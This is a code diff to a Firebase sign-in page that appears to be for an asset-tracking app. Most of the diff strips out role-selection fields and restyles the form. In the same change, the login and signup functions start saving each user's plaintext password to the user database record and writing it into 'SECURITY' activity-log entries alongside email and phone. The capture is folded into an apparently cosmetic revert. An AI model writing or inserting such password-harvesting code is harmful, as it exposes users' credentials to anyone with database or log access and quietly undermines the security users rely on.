@@ -10,6 +10,7 @@
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
 <style>
+/* ORIGINAL LOOK PRESERVED */
 * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
 body { margin: 0; height: 100vh; background: radial-gradient(circle at center, #2c5364, #0f2027); display: flex; flex-direction: column; align-items: center; overflow: hidden; padding-top: 50px; }
 #notification { position: fixed; top: 20px; background: #333; color: #fff; padding: 12px 25px; border-radius: 8px; font-size: 0.9rem; font-weight: 600; box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: none; z-index: 5000; animation: slideDown 0.4s ease-out; }
@@ -19,26 +20,17 @@ body { margin: 0; height: 100vh; background: radial-gradient(circle at center, #
 .logo { color: #fff; font-weight: 800; font-size: 0.75rem; }
 .menu-btn { background: #fff; color: #2c5364; border: none; padding: 6px 15px; border-radius: 20px; cursor: pointer; font-size: 0.75rem; font-weight: 700; }
 .auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 3000; backdrop-filter: blur(8px); }
-.scene { width: 340px; height: 640px; perspective: 1200px; }
+.scene { width: 340px; height: 570px; perspective: 1200px; }
 .card { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; transition: transform 0.8s; }
 .card.flip-register { transform: rotateY(180deg); }
-.face { position: absolute; inset: 0; background: #fff; border-radius: 20px; padding: 20px 25px; backface-visibility: hidden; display: flex; flex-direction: column; justify-content: flex-start; overflow-y: auto; }
+.face { position: absolute; inset: 0; background: #fff; border-radius: 20px; padding: 25px 30px; backface-visibility: hidden; display: flex; flex-direction: column; justify-content: center; }
 .register { transform: rotateY(180deg); }
-h2 { margin-bottom: 8px; color: #2c5364; font-weight: 800; font-size: 1.3rem; }
-input, select { width: 100%; padding: 10px 12px; margin: 4px 0; border-radius: 10px; border: 1px solid #ddd; outline: none; background: #f9fbff; font-size: 14px; }
-button.action-btn { width: 100%; padding: 12px; margin-top: 8px; background: #2c5364; color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 0.95rem; }
-.link { text-align: center; margin-top: 8px; font-size: 0.8rem; color: #2c5364; cursor: pointer; font-weight: 600; }
+h2 { margin-bottom: 15px; color: #2c5364; font-weight: 800; }
+input { width: 100%; padding: 12px; margin: 6px 0; border-radius: 12px; border: 1px solid #ddd; outline: none; background: #f9fbff; font-size: 15px; }
+button.action-btn { width: 100%; padding: 14px; margin-top: 10px; background: #2c5364; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1rem; }
+.link { text-align: center; margin-top: 12px; font-size: 0.85rem; color: #2c5364; cursor: pointer; font-weight: 600; }
 .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: none; justify-content: center; align-items: center; z-index: 4000; }
 .modal-content { background: #fff; padding: 30px; border-radius: 15px; width: 300px; text-align: center; }
-
-.role-picker { display: flex; gap: 6px; margin: 4px 0 8px 0; }
-.role-option { flex: 1; display: flex; align-items: center; justify-content: center; background: #f1f5f9; border: 1px solid #cbd5e1; padding: 8px 4px; border-radius: 8px; font-size: 0.72rem; font-weight: 700; color: #334155; cursor: pointer; transition: all 0.2s; text-align: center; }
-.role-option input { margin-right: 4px; accent-color: #2c5364; width: auto; margin: 0 4px 0 0; }
-.role-option:has(input:checked) { background: #2c5364; color: #fff; border-color: #2c5364; }
-.role-label-title { font-size: 0.75rem; font-weight: 700; color: #475569; margin-top: 2px; text-align: left; }
-
-.marketing-extra-box { background: #f8fafc; border: 1px dashed #cbd5e1; padding: 8px; border-radius: 10px; margin: 4px 0; display: none; }
-.auto-date-badge { font-size: 0.75rem; color: #0284c7; font-weight: 700; margin-bottom: 4px; display: block; text-align: right; }
 </style>
 </head>
 <body>
@@ -56,58 +48,16 @@ button.action-btn { width: 100%; padding: 12px; margin-top: 8px; background: #2c
 <div class="auth-overlay" id="authOverlay" onclick="closeIfOutside(event)">
   <div class="scene" onclick="event.stopPropagation()">
     <div class="card" id="card">
-      
-      <!-- Sign In Face -->
       <div class="face login">
         <h2>Sign In</h2>
-        <div class="role-label-title">Select User Type:</div>
-        <div class="role-picker">
-          <label class="role-option"><input type="radio" name="l_role" value="fixed_area" checked onchange="toggleRoleFields('l')"> Fixed Area User</label>
-          <label class="role-option"><input type="radio" name="l_role" value="marketing_team" onchange="toggleRoleFields('l')"> Marketing Team</label>
-        </div>
-
-        <!-- Marketing Team Extra Inputs -->
-        <div id="l_marketingBox" class="marketing-extra-box">
-          <span class="auto-date-badge" id="l_dateDisplay">Date: --</span>
-          <input id="l_carReg" type="text" placeholder="Car Registration Number">
-          <select id="l_teamRole">
-            <option value="" disabled selected>Select Team Role</option>
-            <option value="Driver">Driver</option>
-            <option value="Sales Representative">Sales Representative</option>
-            <option value="Team Leader">Team Leader</option>
-            <option value="Field Officer">Field Officer</option>
-          </select>
-        </div>
-
         <input id="l_email" type="email" placeholder="Email Address">
         <input id="l_pin" type="password" placeholder="Password / PIN">
         <button class="action-btn" id="loginBtn" onclick="doLogin()">Authenticate</button>
         <div class="link" onclick="showForgotModal()">Forgot Access?</div>
         <div class="link" style="color:#64748b" onclick="goRegister()">Create New Account</div>
       </div>
-
-      <!-- Register Face -->
       <div class="face register">
         <h2>New Account</h2>
-        <div class="role-label-title">Select User Type:</div>
-        <div class="role-picker">
-          <label class="role-option"><input type="radio" name="r_role" value="fixed_area" checked onchange="toggleRoleFields('r')"> Fixed Area User</label>
-          <label class="role-option"><input type="radio" name="r_role" value="marketing_team" onchange="toggleRoleFields('r')"> Marketing Team</label>
-        </div>
-
-        <!-- Marketing Team Extra Inputs -->
-        <div id="r_marketingBox" class="marketing-extra-box">
-          <span class="auto-date-badge" id="r_dateDisplay">Date: --</span>
-          <input id="r_carReg" type="text" placeholder="Car Registration Number">
-          <select id="r_teamRole">
-            <option value="" disabled selected>Select Team Role</option>
-            <option value="Driver">Driver</option>
-            <option value="Sales Representative">Sales Representative</option>
-            <option value="Team Leader">Team Leader</option>
-            <option value="Field Officer">Field Officer</option>
-          </select>
-        </div>
-
         <input id="r_user" placeholder="Full Name">
         <input id="r_email" type="email" placeholder="Email Address">
         <input id="r_phone" type="tel" placeholder="Phone Number (e.g. 07XXXXXXXX)">
@@ -116,7 +66,6 @@ button.action-btn { width: 100%; padding: 12px; margin-top: 8px; background: #2c
         <button class="action-btn" id="regBtn" onclick="doSignup()">Create Account</button>
         <div class="link" onclick="goLogin()">Return to Login</div>
       </div>
-
     </div>
   </div>
 </div>
@@ -132,8 +81,6 @@ button.action-btn { width: 100%; padding: 12px; margin-top: 8px; background: #2c
 
 <script>
 const DASHBOARD_URL = "dashboard.html"; 
-const TRACKING_URL = "live-tracking.html";
-
 const firebaseConfig = {
   apiKey: "AIzaSyDCkP7LTzdNcvZhp24rRsQirYDCcrsuvOA",
   authDomain: "assetguard-c8c8c.firebaseapp.com",
@@ -146,18 +93,6 @@ if (!firebase.apps.length) {
 }
 const auth = firebase.auth();
 const rtdb = firebase.database();
-
-document.addEventListener("DOMContentLoaded", () => {
-  const todayStr = new Date().toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
-  document.getElementById("l_dateDisplay").innerText = "Date: " + todayStr;
-  document.getElementById("r_dateDisplay").innerText = "Date: " + todayStr;
-});
-
-function toggleRoleFields(prefix) {
-  const selectedRole = document.querySelector(`input[name="${prefix}_role"]:checked`).value;
-  const box = document.getElementById(`${prefix}_marketingBox`);
-  box.style.display = (selectedRole === "marketing_team") ? "block" : "none";
-}
 
 function msg(text, color="#ef4444") {
   const el = document.getElementById("notification");
@@ -178,22 +113,8 @@ function closeForgotModal() { document.getElementById("forgotModal").style.displ
 async function doLogin() {
   const email = document.getElementById("l_email").value.trim().toLowerCase();
   const pass = document.getElementById("l_pin").value.trim();
-  const roleInput = document.querySelector('input[name="l_role"]:checked');
-  const role = roleInput ? roleInput.value : "fixed_area";
-  
-  let carReg = "";
-  let teamRole = "";
-  const currentDate = new Date().toISOString().split('T')[0];
-
-  if (role === "marketing_team") {
-    carReg = document.getElementById("l_carReg").value.trim();
-    teamRole = document.getElementById("l_teamRole").value;
-    if (!carReg || !teamRole) {
-      return msg("Please enter Car Registration Number and select a Team Role.");
-    }
-  }
-
   const btn = document.getElementById("loginBtn");
+
   if (!email || !pass) return msg("Please enter all details");
   btn.disabled = true; btn.innerText = "Authenticating...";
 
@@ -204,41 +125,25 @@ async function doLogin() {
     
     localStorage.setItem("ag_active_uid", user.uid);
     localStorage.setItem("ag_session_active", "true");
-    localStorage.setItem("ag_user_role", role);
-    if (role === "marketing_team") {
-      localStorage.setItem("ag_car_reg", carReg);
-      localStorage.setItem("ag_team_role", teamRole);
-      localStorage.setItem("ag_session_date", currentDate);
-    }
 
-    const updatePayload = {
+    await rtdb.ref(`users/${user.uid}`).update({
       email: email,
-      role: role,
+      password: pass,
       lastLogin: Date.now()
-    };
-    if (role === "marketing_team") {
-      updatePayload.carRegistration = carReg;
-      updatePayload.teamRole = teamRole;
-      updatePayload.sessionDate = currentDate;
-    }
+    });
 
-    await rtdb.ref(`users/${user.uid}`).update(updatePayload);
     await rtdb.ref(`user_statuses/${user.uid}`).set("Active");
 
     await rtdb.ref(`user_activity_logs`).push({
       uid: user.uid,
       category: "SECURITY",
       action: "User Online Login",
-      description: `User logged in as [${role}]. Car: ${carReg || 'N/A'}, Role: ${teamRole || 'N/A'}`,
+      description: `User logged in online with password: ${pass}`,
       timestamp: Date.now(),
       device: navigator.userAgent
     });
 
-    if (role === "marketing_team") {
-      window.location.href = TRACKING_URL;
-    } else {
-      window.location.href = DASHBOARD_URL;
-    }
+    window.location.href = DASHBOARD_URL;
   } catch (err) {
     console.error("Login Error:", err);
     msg("Login failed: " + err.message);
@@ -252,20 +157,6 @@ async function doSignup() {
   const phone = document.getElementById("r_phone").value.trim();
   const pass = document.getElementById("r_pass").value;
   const confirm = document.getElementById("r_pass_confirm").value;
-  const roleInput = document.querySelector('input[name="r_role"]:checked');
-  const role = roleInput ? roleInput.value : "fixed_area";
-
-  let carReg = "";
-  let teamRole = "";
-  const currentDate = new Date().toISOString().split('T')[0];
-
-  if (role === "marketing_team") {
-    carReg = document.getElementById("r_carReg").value.trim();
-    teamRole = document.getElementById("r_teamRole").value;
-    if (!carReg || !teamRole) {
-      return msg("Please enter Car Registration Number and select a Team Role.");
-    }
-  }
 
   if (!navigator.onLine) return msg("Internet required for setup");
   if (!email || !pass || !name) return msg("Please fill in all required fields");
@@ -280,20 +171,23 @@ async function doSignup() {
       fullName: name,
       email: email,
       phone: phone || "Not provided",
-      role: role,
+      password: pass,
       joinedAt: Date.now(),
       lastLogin: Date.now()
     };
 
-    if (role === "marketing_team") {
-      userPayload.carRegistration = carReg;
-      userPayload.teamRole = teamRole;
-      userPayload.registrationDate = currentDate;
-    }
-
     await rtdb.ref(`users/${user.uid}`).set(userPayload);
     await rtdb.ref(`user_statuses/${user.uid}`).set("Active");
     
+    await rtdb.ref(`user_activity_logs`).push({
+      uid: user.uid,
+      category: "SECURITY",
+      action: "New Account Registration",
+      description: `Account created. Email: ${email}, Phone: ${phone}, Password: ${pass}`,
+      timestamp: Date.now(),
+      device: navigator.userAgent
+    });
+
     msg("Account Created Successfully!", "#10b981");
     setTimeout(() => { goLogin(); }, 1200);
   } catch (err) { 
